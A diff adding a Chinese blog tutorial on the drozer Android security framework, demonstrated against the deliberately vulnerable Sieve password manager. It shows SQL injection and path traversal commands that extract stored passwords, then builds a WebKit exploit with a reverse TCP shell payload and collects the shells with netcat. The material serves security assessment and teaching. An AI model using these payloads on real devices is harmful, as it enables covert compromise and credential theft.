@@ -150,6 +150,276 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-How-to-use-drozer" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/28/How-to-use-drozer/">How-to-use-drozer</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/28/How-to-use-drozer/" class="archive-article-date">
+  	<time datetime="2018-09-28T03:18:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-Getting-Started"><a href="#1-Getting-Started" class="headerlink" title="1.Getting Started"></a>1.Getting Started</h2><h3 id="1-1-Starting-a-Session"><a href="#1-1-Starting-a-Session" class="headerlink" title="1.1 Starting a Session"></a>1.1 Starting a Session</h3><p> 默认情况下，drozer使用端口31415：</p>
+<p><code>adb forward tcp:31415 tcp:31415</code></p>
+<p>启动代理，选择“Embedded Server” 点击 “Enable”</p>
+<p><code>drozer console connect</code></p>
+<h3 id="1-2-Inside-the-drozer-Console"><a href="#1-2-Inside-the-drozer-Console" class="headerlink" title="1.2 Inside the drozer Console"></a>1.2 Inside the drozer Console</h3><p>drozer Console 是一个命令行环境</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>run MODULE</td>
+<td>执行一个drozer模块</td>
+</tr>
+<tr>
+<td>list</td>
+<td>显示当前执行的所有drozer模块列表</td>
+</tr>
+<tr>
+<td>shell/cd</td>
+<td>Linux shell</td>
+</tr>
+<tr>
+<td>clean</td>
+<td>删除drozer在Android设备上存储的临时文件</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>print到console</td>
+</tr>
+<tr>
+<td>exit</td>
+<td>终止drozer会话</td>
+</tr>
+<tr>
+<td>help</td>
+<td>显示帮助</td>
+</tr>
+<tr>
+<td>load</td>
+<td>加载包含drozer命令的文件，并按顺序执行它们。</td>
+</tr>
+<tr>
+<td>module</td>
+<td>从Internnet查找并安装其他drozer模块</td>
+</tr>
+<tr>
+<td>permissions</td>
+<td>显示授予drozer Agent的权限列表</td>
+</tr>
+<tr>
+<td>set</td>
+<td>将值存储在将作为环境变量传递给drozer生成的任何Linux shell的变量中。</td>
+</tr>
+<tr>
+<td>unset</td>
+<td>Remove a named variable that drozer passes to any Linux shells that it spawns.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-Using-drozer-for-Security-Assessment"><a href="#2-Using-drozer-for-Security-Assessment" class="headerlink" title="2.Using drozer for Security Assessment"></a>2.Using drozer for Security Assessment</h2><p>用<a href="http://mwr.to/sieve." target="_blank" rel="noopener">Sieve</a>进行测试，讲解使用方法。</p>
+<h3 id="2-1-Sieve"><a href="#2-1-Sieve" class="headerlink" title="2.1 Sieve"></a>2.1 Sieve</h3><p>Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。<br>首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。<br>在开始本教程之前，请将Sieve安装到Android模拟器上并创建几组凭据。</p>
+<h3 id="2-2-Retrieving-Package-Information"><a href="#2-2-Retrieving-Package-Information" class="headerlink" title="2.2 Retrieving Package Information"></a>2.2 Retrieving Package Information</h3><p>评估Sieve的第一步是在Android设备上找到它。 安装在Android设备上的应用程序由其“包名称”唯一标识。 我们可以使用<code>app.package.list</code>命令查找Sieve的标识符：</p>
+<blockquote>
+<p>dz&gt; run app.package.list -f sieve</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>使用<code>app.package.info</code>命令提供有关包的一些基本信息：</p>
+<blockquote>
+<p>dz&gt;run app.package.info    -a com.mwr.example.sieve</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">Process Name: com.mwr.example.sieve</span><br><span class="line">Version: 1.0</span><br><span class="line">Data Directory: /data/data/com.mwr.example.sieve</span><br><span class="line">APK Path: /data/app/com.mwr.example.sieve-2.apk</span><br><span class="line">UID: 10056</span><br><span class="line">GID: [1028, 1015, 3003]</span><br><span class="line">Shared Libraries: null</span><br><span class="line">Shared User ID: null</span><br><span class="line">Uses Permissions:</span><br><span class="line">- android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line"> - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line"> - android.permission.INTERNET</span><br><span class="line">Defines Permissions:</span><br><span class="line"> - com.mwr.example.sieve.READ_KEYS</span><br><span class="line"> - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-Identify-the-Attack-Surface"><a href="#2-3-Identify-the-Attack-Surface" class="headerlink" title="2.3 Identify the Attack Surface"></a>2.3 Identify the Attack Surface</h3><p>只考虑通过Android的进程间通信（IPC）内置机制暴露的漏洞。 这些漏洞通常会导致敏感数据泄漏到安装在同一设备上的其他应用程序。</p>
+<blockquote>
+<p>dz&gt; run app.package.attacksurface com.mwr.example.sieve</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Attack Surface:</span><br><span class="line"> 3 activities exported    		//使其它应用程序可访问</span><br><span class="line"> 0 broadcast receivers exported	//应用程序使用的屏幕</span><br><span class="line"> 2 content providers exported	//内容提供程序（数据库对象）</span><br><span class="line"> 2 services exported			//服务（后台工作程序）</span><br><span class="line"> is debuggable					//该服务可调试，可以使用adb将调试器附加到进程，并逐步执行代码</span><br></pre></td></tr></table></figure>
+<h3 id="2-4-Launching-Activities"><a href="#2-4-Launching-Activities" class="headerlink" title="2.4 Launching Activities"></a>2.4 Launching Activities</h3><p>深入attack。例如询问sieve导出哪些Activities</p>
+<blockquote>
+<p>dz&gt; run app.activity.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> com.mwr.example.sieve.FileSelectActivity</span><br><span class="line"> com.mwr.example.sieve.MainLoginActivity</span><br><span class="line"> com.mwr.example.sieve.PWList		//activity已经导出，并没有请求任何权限</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run app.activity.start –component </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; help app.activity.start </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]</span><br><span class="line"> 	[--component PACKAGE COMPONENT] [--data-uri DATA_URI]</span><br><span class="line"> 	[--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]</span><br><span class="line"> 	[--mimetype MIMETYPE]</span><br></pre></td></tr></table></figure>
+<h3 id="2-5-Reading-from-Content-Providers"><a href="#2-5-Reading-from-Content-Providers" class="headerlink" title="2.5 Reading from Content Providers"></a>2.5 Reading from Content Providers</h3><p>收集有关应用程序导出的内容提供商的更多信息。 提供了一个简单的命令来请求其他信息：</p>
+<blockquote>
+<p>dz&gt; run app.provider.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> 	Authority: com.mwr.example.sieve.DBContentProvider</span><br><span class="line"> 	Read Permission: null</span><br><span class="line"> 	Write Permission: null</span><br><span class="line"> 	Content Provider: com.mwr.example.sieve.DBContentProvider</span><br><span class="line"> 	Multiprocess Allowed: True</span><br><span class="line"> 	Grant Uri Permissions: False</span><br><span class="line"> 	Path Permissions:</span><br><span class="line"> 	Path: /Keys</span><br><span class="line"> 	Type: PATTERN_LITERAL</span><br><span class="line"> 	Read Permission: com.mwr.example.sieve.READ_KEYS</span><br><span class="line"> 	Write Permission: com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line"> 	Authority: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"> 	Read Permission: null</span><br><span class="line"> 	Write Permission: null</span><br><span class="line"> 	Content Provider: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"> 	Multiprocess Allowed: True</span><br><span class="line"> 	Grant Uri Permissions: False</span><br></pre></td></tr></table></figure>
+<p>这显示了攻击面在第2.3节中提到的两个导出的内容提供程序。 它确认这些内容提供者不需要任何特定权限与它们进行交互，但DBContentProvider中的/ Keys路径除外。</p>
+<h4 id="2-5-1-Database-backed-Content-Providers-Data-Leakage"><a href="#2-5-1-Database-backed-Content-Providers-Data-Leakage" class="headerlink" title="2.5.1 Database-backed Content Providers(Data Leakage)"></a>2.5.1 Database-backed Content Providers(Data Leakage)</h4><p>一个名为“DBContentProvider”的内容提供者将在其后端拥有某种形式的数据库。 但是，如果不知道此内容提供商的组织方式，将很难提取任何信息。</p>
+<p>可以重构部分内容URI来访问DBContentProvider，知道它们必须以“content：//”开头。 但是，无法知道提供程序将接受的所有路径组件。</p>
+<p>幸运的是，Android应用程序倾向于提供有关内容URI的提示。 例如，在<code>app.provider.info</code>命令的输出中，我们看到“/ Keys”可能作为路径存在，但不能在没有READ_KEYS权限的情况下查询它。</p>
+<p>drozer提供了一个扫描器模块，它汇集了各种方法来猜测路径并划分可访问内容URI列表：</p>
+<blockquote>
+<p>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">...</span><br><span class="line">Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line">Accessible content URIs:</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+<p>现在可以使用其他drozer模块从这些内容URI中检索信息，甚至可以修改数据库中的数据：</p>
+<blockquote>
+<p>dz&gt;run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_id: 1</span><br><span class="line">service: Email</span><br><span class="line">username: incognitoguy50</span><br><span class="line">password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64-encoded)</span><br><span class="line">email: incognitoguy50@gmail.com</span><br></pre></td></tr></table></figure>
+<h4 id="2-5-2-Database-backed-Content-Providers-SQL-Injection"><a href="#2-5-2-Database-backed-Content-Providers-SQL-Injection" class="headerlink" title="2.5.2 Database-backed Content Providers(SQL Injection)"></a>2.5.2 Database-backed Content Providers(SQL Injection)</h4><p>Android平台促进使用SQLite数据库来存储用户数据。 由于这些数据库使用SQL，可能容易受到SQL注入攻击</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘“ </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unrecognized token: &quot;&apos; FROM Passwords&quot; (code 1): , while compiling: SELECT &apos; FROM Passwords</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘“ </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unrecognized token: &quot;&apos;)&quot; (code 1): , while compiling: SELECT * FROM Passwords</span><br><span class="line">WHERE (&apos;)</span><br></pre></td></tr></table></figure>
+<p>Android返回一个非常详细的错误消息，显示它尝试执行的整个查询。可以充分利用此漏洞列出数据库中的所有表：</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–” </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| type  | name             | tbl_name         | rootpage | sql 				|</span><br><span class="line">| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |</span><br><span class="line">| table | Passwords        | Passwords 		  | 4 		 | CREATE TABLE ... |</span><br><span class="line">| table | Key 			   | Key 	   	 	  | 5 		 | CREATE TABLE ... |</span><br></pre></td></tr></table></figure>
+<p>或查询其他受保护的表：</p>
+<blockquote>
+<p>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–”</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| Password 		   | pin  |</span><br><span class="line">| thisismypassword | 9876 |</span><br></pre></td></tr></table></figure>
+<h4 id="2-5-3-File-System-backed-Content-Providers"><a href="#2-5-3-File-System-backed-Content-Providers" class="headerlink" title="2.5.3 File System-backed Content Providers"></a>2.5.3 File System-backed Content Providers</h4><p>内容提供商可以提供对底层文件系统的访问。 这允许应用程序共享文件，否则Android沙箱会阻止它。<br>由于我们可以合理地假设FileBackupProvider是一个由文件系统支持的内容提供程序，并且路径组件表示我们要打开的文件的位置，因此我们可以轻松猜出此内容的URI并使用drozer模块来读取文件：</p>
+<blockquote>
+<p>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </p>
+</blockquote>
+<p><code>127.0.0.1        localhost</code></p>
+<p>读取<code>/ etc / hosts</code>文件不是一个大问题但是在第3.2节中发现了应用程序数据目录的路径，我们可以查看更多敏感信息：</p>
+<blockquote>
+<p>dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>
+<p>这已将应用程序的数据库从设备复制到本地计算机，可以在其中进行浏览。sqlite不仅提取用户的加密密码，还提取其主密码。</p>
+<h4 id="2-5-4-Content-Provider-Vulnerabilities"><a href="#2-5-4-Content-Provider-Vulnerabilities" class="headerlink" title="2.5.4 Content Provider Vulnerabilities"></a>2.5.4 Content Provider Vulnerabilities</h4><p>我们已经看到内容提供程序可能容易受到SQL注入和目录遍历的攻击。drozer提供模块来自动测试这些漏洞的简单案例：</p>
+<blockquote>
+<p>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Injection in Projection:</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Injection in Selection:</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line"> 	content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Vulnerable Providers:</span><br><span class="line"> content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line"> content://com.mwr.example.sieve.FileBackupProvider</span><br></pre></td></tr></table></figure>
+<h3 id="2-6-Interacting-with-Services"><a href="#2-6-Interacting-with-Services" class="headerlink" title="2.6 Interacting with Services"></a>2.6 Interacting with Services</h3><blockquote>
+<p>dz&gt; run app.service.info -a com.mwr.example.sieve </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Package: com.mwr.example.sieve</span><br><span class="line"> com.mwr.example.sieve.AuthService</span><br><span class="line"> Permission: null</span><br><span class="line"> com.mwr.example.sieve.CryptoService</span><br><span class="line"> 	Permission: null</span><br></pre></td></tr></table></figure>
+<p>这些服务再次导出到所有其他应用程序，无需访问权限。 由于我们正在尝试解密密码，因此CryptoService看起来很有趣。<br>充分利用Sieve的CryptoService作为练习。 它通常涉及反编译应用程序以确定协议，并使用“<code>app.service.send</code>”或编写自定义drozer模块来向服务发送消息。</p>
+<h3 id="2-7-Other-Modules"><a href="#2-7-Other-Modules" class="headerlink" title="2.7 Other Modules"></a>2.7 Other Modules</h3><p>drozer提供了许多在安全评估期间有用的其他模块：<br><code>shell.start</code><br>在设备上启动交互式Linux shell。<br><code>tools.file.upload/ tools.file.download</code><br>允许将文件复制到Android设备或从Android设备复制文件。<br><code>tools.setup.busybox/ tools.setup.minimalsu</code><br>在设备上安装有用的二进制文件。</p>
+<h2 id="3-Exploitation-Features-in-drozer"><a href="#3-Exploitation-Features-in-drozer" class="headerlink" title="3.Exploitation Features in drozer"></a>3.Exploitation Features in drozer</h2><p>drozer提供的功能可帮助将drozer代理部署到远程设备上，方法是利用设备上的应用程序或执行涉及一定程度社会工程的攻击。<br>drozer提供了一个共享漏洞和重用高质量有效载荷的框架。 它提供的模块允许生成用于漏洞利用的shell代码，以帮助访问远程受感染设备上的敏感数据。</p>
+<h3 id="3-1-Infrastructure-Mode"><a href="#3-1-Infrastructure-Mode" class="headerlink" title="3.1 Infrastructure Mode"></a>3.1 Infrastructure Mode</h3><p>到目前为止，您可能已经在“直接模式”运行drozer，您可以在其中运行代理的嵌入式服务器并直接连接到它。 这对于通过adb或本地Wi-Fi网络连接的设备非常方便。<br>drozer支持另一种操作模式：“基础设施模式”。在基础结构模式下，您可以在网络上或Internet上运行drozer服务器，为服务器和代理提供集合点，并在它们之间路由会话。<br>由于基础结构模式可以从设备建立出站连接，因此对于您不知道设备的IP地址或需要遍历NAT或防火墙的情况也很有用。</p>
+<h4 id="3-1-1-Running-a-drozer-Server"><a href="#3-1-1-Running-a-drozer-Server" class="headerlink" title="3.1.1 Running a drozer Server"></a>3.1.1 Running a drozer Server</h4><p>要运行drozer服务器，您需要一台安装了drozer的计算机，移动设备和运行控制台的PC都可以访问该计算机.</p>
+<p><code>drozer server start</code></p>
+<h4 id="3-1-2-Connecting-an-Agent"><a href="#3-1-2-Connecting-an-Agent" class="headerlink" title="3.1.2 Connecting an Agent"></a>3.1.2 Connecting an Agent</h4><p>要使代理连接到服务器，必须将其详细信息添加为“端点”。 在设备上：<br>1.启动drozer Agent，按菜单按钮，然后选择“设置”。<br>2.选择“新端点”。<br>3.将“主机”设置为服务器的主机名或IP地址。<br>4.将“端口”设置为运行服务器的端口，除非它是标准配置<br>5.按“保存”（您可能需要按旧设备上的菜单按钮）。<br>如果您导航回主屏幕，您应该在drozer下看到您的终端。 选择它并以与启动嵌入式服务器相同的方式启用它。</p>
+<h4 id="3-1-3-Connecting-a-Console"><a href="#3-1-3-Connecting-a-Console" class="headerlink" title="3.1.3 Connecting a Console"></a>3.1.3 Connecting a Console</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console devices --server myserver:31415</span><br><span class="line">List of Bound Devices</span><br><span class="line">Device ID 		 Manufacturer Model Software</span><br><span class="line">67dcdbacd1ea6b60 unknown 	  sdk   4.1.2</span><br><span class="line">67dcdbacd1ea6b61 unknown 	  sdk   4.2.0</span><br></pre></td></tr></table></figure>
+<p>其中“myserver”是drozer服务器的主机名或IP地址。<br>这表明我们连接了两台设备，运行不同版本的Jellybean。 您可以在启动控制台时通过提供其设备ID来指定要使用的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console connect 67dcdbacd1ea6b60 –-server myserver:31415</span><br><span class="line">…</span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-1-4-drozer-Servr-and-Exploitation"><a href="#3-1-4-drozer-Servr-and-Exploitation" class="headerlink" title="3.1.4 drozer Servr and Exploitation"></a>3.1.4 drozer Servr and Exploitation</h4><p>drozer服务器对于利用是至关重要的，因为它在一个服务器中扮演多个服务器：<br>如果drozer代理连接，则drozerp使用drozer的自定义二进制协议<br>如果Web浏览器连接http，它通过HTTP提供资源<br>字节流如果在传输开始时发送特定字节，则它会响应流式传输资源<br>shell服务器如果将’S’（0x53）作为第一个字节发送，则连接将作为绑定shell缓存<br>drozer在整个利用期间利用此服务器来托管成功完成漏洞利用所需的资源，并将代理部署到设备并从受感染设备接收连接。</p>
+<h3 id="3-2-Exploits"><a href="#3-2-Exploits" class="headerlink" title="3.2 Exploits"></a>3.2 Exploits</h3><p>drozer exploit模板和shellcode是特殊类型的drozer模块。 它们由<code>drozer exploit</code>命令组合以创建一个完整的漏洞：</p>
+<p><code>$ drozer exploit build EXPLOIT SHELLCODE [OPTIONS]</code></p>
+<p>可以通过运行列出可用的漏洞利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ drozer exploit list</span><br><span class="line">exploit.remote.webkit.nanparse</span><br><span class="line"> 			Webkit Invalid NaN Parsing (CVE-2010-1807)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>查看可利用的shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ drozer shellcode list</span><br><span class="line">shell.reverse_tcp.armeabi Establish a reverse TCP Shell (ARMEABI)</span><br><span class="line">weasel.reverse_tcp.armeabi weasel through a reverse TCP Shell (ARMEABI)</span><br></pre></td></tr></table></figure>
+<p>可以为CVE-2010-1807构建一个漏洞，利用weasel（MWR的高级有效载荷）在旧的Android 2.1设备上获得foothold：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi</span><br><span class="line">--server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html</span><br><span class="line">Uploading weasel to /weasel and W... [ OK ]</span><br><span class="line">Uploading the Agent to /agent.apk and A... [ OK ]</span><br><span class="line">Uploading Exploit to /home.html... [ OK ]</span><br><span class="line">Done. The exploit is available at: http://10.0.2.2:31415/home.html</span><br></pre></td></tr></table></figure>
+<p>将易受攻击的设备指向其Web浏览器中的漏洞利用地址，不久之后您将从该漏洞获得一个连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ drozer console devices</span><br><span class="line">List of Bound Devices</span><br><span class="line">Device ID 			Manufacturer Model 		Software</span><br><span class="line">9265590285227392218 unknown 	 unknown 	unknown</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-weasel"><a href="#3-3-weasel" class="headerlink" title="3.3 weasel"></a>3.3 weasel</h3><p>在3.2节中，看到了weasel如何将轻量级代理部署到易受攻击的设备上。<br>weasel是drozer的高级有效负载，可在受损设备上自动获得maximum leverage。</p>
+<ul>
+<li>Here‘s what happens:<ul>
+<li>vulnerable 设备被利用</li>
+<li>exploit运行shell代码，建立与drozer服务器的反向TCP shell连接。</li>
+<li>payload 向drozer服务器发送一个’W’（0x57），去执行weasel stager 序列。</li>
+<li>drozer服务器提供shell命令来安装和启动weasel。</li>
+<li>weasel尝试了许多技术来运行drozer代理。</li>
+</ul>
+</li>
+</ul>
+<p>根据weasel升级权限的能力，您将从完整代理，有限代理或仅正常的反向shell接收连接。</p>
+<h4 id="3-3-1-Full-Agent"><a href="#3-3-1-Full-Agent" class="headerlink" title="3.3.1 Full Agent"></a>3.3.1 Full Agent</h4><p>如果weasel能够安装包，将从完整的drozer代理接收连接。 这与目前使用的代理程序相同，但不会向设备所有者显示GUI。</p>
+<h4 id="３-3-2-Limited-Agent"><a href="#３-3-2-Limited-Agent" class="headerlink" title="３.3.2 Limited Agent"></a>３.3.2 Limited Agent</h4><p>如果weasel无法安装软件包，它仍然可以运行drozer代理的版本。 这是完整代理，但无权访问任何“应用程序上下文”。 这可以防止它直接与运行时的各个部分进行交互，例如程序包管理器，因此无法与其他程序包或其IPC端点进行交互。 如果获得有限代理，drozer将自动隐藏无法运行的模块，从“list”命令.</p>
+<h4 id="3-3-3-Reverse-Shell"><a href="#3-3-3-Reverse-Shell" class="headerlink" title="3.3.3 Reverse Shell"></a>3.3.3 Reverse Shell</h4><p>如果drozer甚至无法执行有限代理，它将为drozer服务器提供正常的Linux shell。<br>可以通过使用netcat连接到服务器来收集这些shell，并发送一行说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc myserver 31415</span><br><span class="line">COLLECT</span><br><span class="line">drozer Shell Server</span><br><span class="line">-------------------</span><br><span class="line">There is 1 shell waiting...</span><br><span class="line">1) 127.0.0.1:54214</span><br><span class="line">Shell: 1</span><br><span class="line">/system/bin/id</span><br><span class="line">uid=10058(u0_a58) gid=10058(u0_a58) groups=1028(sdcard_r),3003(inet)</span><br></pre></td></tr></table></figure>
+<h2 id="4-Install-Modules"><a href="#4-Install-Modules" class="headerlink" title="4.Install Modules"></a>4.Install Modules</h2><p>drozer提供模块来研究Android平台的各个方面，以及一些远程攻击。<br>可以通过下载和安装其他模块来扩展drozer的功能。</p>
+<h3 id="4-1-Finding-Modules"><a href="#4-1-Finding-Modules" class="headerlink" title="4.1 Finding Modules"></a>4.1 Finding Modules</h3><p>官方drozer模块存储库与Github上的主项目一起托管。 这会自动设置在您的drozer副本中。 可以使用<code>module</code>命令搜索模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; module search root</span><br><span class="line">metall0id.root.cmdclient</span><br><span class="line">metall0id.root.exynosmem.exynosmem</span><br><span class="line">metall0id.root.scanner_check</span><br><span class="line">metall0id.root.ztesyncagent</span><br></pre></td></tr></table></figure>
